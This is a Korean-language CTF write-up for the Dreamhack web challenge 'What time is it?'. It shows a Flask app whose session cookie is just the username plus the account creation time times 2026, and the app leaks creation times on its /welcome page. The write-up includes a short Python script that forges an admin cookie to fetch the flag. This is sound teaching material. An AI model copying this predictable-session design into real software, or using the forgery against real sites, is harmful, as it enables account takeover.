---
title: "[Dreamhack] What time is it? 해설"
author: jyp
date: 2026-04-02 15:00:00 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

## 문제 특징

> 가입시간으로 정해지는 Session 쿠키값

### **난이도**: Lv.1
### **카테고리**: 웹해킹

---

## 문제 구조

### 문제파일구성

```
/
├── app.py
├── Dockerfile
├── flag.txt
├── session.py
└── templates
    ├── index.html
    ├── login.html
    ├── register.html
    └── welcome.html
```

### dockerfile


```dockerfile
FROM python:3.11-slim
WORKDIR /app

RUN pip install --no-cache-dir Flask==3.0.3

COPY app.py session.py ./
COPY templates ./templates
COPY flag.txt /flag.txt

EXPOSE 5001
CMD ["python", "app.py"]

```

도커 컨테이너에서 `/app`폴더를 만든 뒤에 모든 내용물을 복사하고, Flask 웹 프레임워크를 실행시키고 있다.


### 주요 코드

```python

//app.py (일부)

import session as sess
FLAG = open("/flag.txt", "r", encoding="utf-8").read()


users = {}
welcome_feed = []  

def add_user(username: str, pw: str, created_at: int):
    users[username] = {"pw": pw, "created_at": created_at}
    welcome_feed.append({"username": username, "created_at": created_at})


if "admin" not in users:
    add_user("admin", "**REDACTED**", int(time.time()))


def current_user():
    s = request.cookies.get("session", "")
    parsed = sess.parse_session(s)
    if not parsed:
        return None

    username, _ = parsed
    u = users.get(username)
    if not u:
        return None

    return sess.verify_session(s, u["created_at"])


@app.get("/")
def index():
    uname = current_user()
    return render_template("index.html", username=uname, is_admin=(uname == "admin"), flag=FLAG)


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "GET":
        return render_template("register.html")

    username = request.form.get("username").strip()
    pw = request.form.get("password")

    if not username or not pw:
        return redirect(url_for("register"))
    if username in users:
        return "Already exists"

    created_at = int(time.time())
    add_user(username, pw, created_at)

    resp = make_response(redirect(url_for("welcome")))
    resp.set_cookie("session", sess.make_session(username, created_at))
    return resp


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "GET":
        return render_template("login.html")

    username = request.form.get("username").strip()
    pw = request.form.get("password")

    u = users.get(username)
    if not u or u["pw"] != pw:
        return "fail"

    resp = make_response(redirect(url_for("welcome")))
    resp.set_cookie("session", sess.make_session(username, u["created_at"]))
    return resp


@app.get("/welcome")
def welcome():
    uname = current_user()
    if not uname:
        return redirect(url_for("login"))

    feed = []
    for row in welcome_feed:
        e = row["created_at"]
        dt = datetime.fromtimestamp(e, tz=timezone.utc).strftime("%d/%m/%Y, %H:%M:%S UTC")
        feed.append({"username": row["username"], "created_at_str": dt})
        

    return render_template("welcome.html", username=uname, users=feed)

```
`username == admin` 이라면 `/`주소에서 플래그를 얻을 수 있다.

```python

//session.py

def make_session(username: str, created_at: int) -> str:
    return f"{username}.{created_at * 2026}"

def parse_session(value: str):
    if not value or "." not in value:
        return None
    username, token = value.split(".", 1)
    username = username.strip()
    token = token.strip()
    if not username or not token:
        return None
    return username, token

def verify_session(value: str, created_at: int) -> str | None:
    parsed = parse_session(value)
    if not parsed:
        return None
    username, token = parsed
    return username if token == str(created_at * 2026) else None

```
`app.py`와 `session.py`파일에서 계정을 생성시, 계정이 생성된 시간을 정수화하고 2026을 곱하여 세션 번호를 정하고, 쿠키에 `유저명.세션번호` 형식으로 `session` 쿠키를 저장하고 있음을 확인할 수 있다.

또한 `parse_session()` 함수와 `verify_session` 함수에서 `session` 쿠키 속 유저명과 세션번호가 일치한다면 정상적으로 해당 유저로 로그인이 가능함을 알 수 있다.


## 풀이

### 어드민의 계정이 만들어진 시간

어드민의 계정이 만들어진 시간을 알고 있다면 우리는 `session` 쿠키값을 직접 `admin.int(어드민가입시간)`으로 수정하여 플래그를 탈취할 수 있을 것이다.
`/welcome` 주소에 접속 시, 모든 계정의 계정 생성 시간을 알 수 있으므로, 이 문제를 풀 수 있게 된다.

## 정답

### 파이썬을 이용한 플래그 탈취

```python
import requests
from datetime import datetime, timezone

dt = datetime.strptime("26/03/2026, 07:52:48 UTC", "%d/%m/%Y, %H:%M:%S UTC")
dt = dt.replace(tzinfo=timezone.utc)
print(int(dt.timestamp()))
token = int(dt.timestamp()) * 2026
session = f"admin.{token}"

r = requests.get("http://문제주소/", cookies={"session": session})
print(r.text)

```

`/welcome` 주소에서 어드민의 계정이 생성된 시간을 복사해 위 코드에 넣으면 된다.




